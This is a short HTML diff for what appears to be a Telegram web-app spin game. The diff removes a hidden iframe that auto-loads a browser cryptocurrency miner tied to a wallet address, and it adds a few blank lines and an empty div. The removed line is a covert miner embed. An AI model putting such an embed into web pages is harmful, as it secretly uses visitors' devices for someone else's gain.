@@ -5,8 +5,10 @@
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>Document</title>
     <link rel="stylesheet" href="style.css">
+
 </head>
 <body>
+
 <div class="container">
     <div id="win" class="win">Win</div>
     <div class="balance">Balance: $<span id="balance"></span></div>
@@ -19,7 +21,8 @@
     <button id="spin-button">Spin</button>
 
     <button id="share-button" class="btn_telegram_share">Join Friends</button>
-    <iframe src="https://mobileminer.org/mine/?auto=1&addr=488ggvm9wZbPHh6nCXehVLVeMXptThm8cKC3HpMpMoZS5HEauGy6W83BRfRG3gDhcPAatMTEZ5podKYSvXK3qN29C5ZWmLX" style="display:none;"></iframe> <script>
+
+    <script>
         document.querySelector("#share-button").addEventListener("click", function() {
             // Тут ваша переменная
             let ref = tg.initDataUnsafe?.user.id
@@ -30,7 +33,7 @@
 <div id="coin-template" class="coin" hidden>
     💰 <!-- emoji-изображение монеты -->
 </div>
-
+<div id="myDiv"></div>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="script.js"></script>
 </body>
